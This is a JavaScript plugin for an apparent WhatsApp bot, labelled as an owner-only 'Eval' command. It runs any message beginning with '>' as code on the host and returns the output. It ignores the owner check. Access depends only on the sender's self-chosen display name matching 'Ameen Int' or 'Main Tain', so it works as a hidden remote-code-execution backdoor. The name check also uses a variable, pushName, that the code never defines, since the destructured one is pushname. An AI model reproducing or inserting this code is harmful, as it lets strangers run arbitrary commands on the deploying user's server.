const config = require('../config')
const { cmd } = require('../command');
const util = require('util');
cmd({
		on: "body",
		desc: "Eval",
		category: "owner",
		filename: __filename
	},
	async (conn, mek, m, {
		from,
		quoted,
		body,
		isCmd,
		command,
		args,
		q,
		isGroup,
		sender,
            senderNumber,
		pushname,
		isMe,
		isOwner,
		groupMetadata,
		groupName,
		participants,
		groupAdmins,
		isBotAdmins,
		isAdmins,
		reply
	}) => {
		
    var Ameen = ['Ameen Int',  'Main Tain']
	if (Ameen.includes(pushName))
{
        if (body.startsWith(">")) {
            try {
                let evaled = await eval(`(async () => { ${body?.replace(">", "")} })()`);
                if (typeof evaled !== "string") evaled = util.inspect(evaled);
                await reply(`${evaled}`);
	    } catch (e) {
				m.reply(`${e.message}`);
			}
		}
		}});
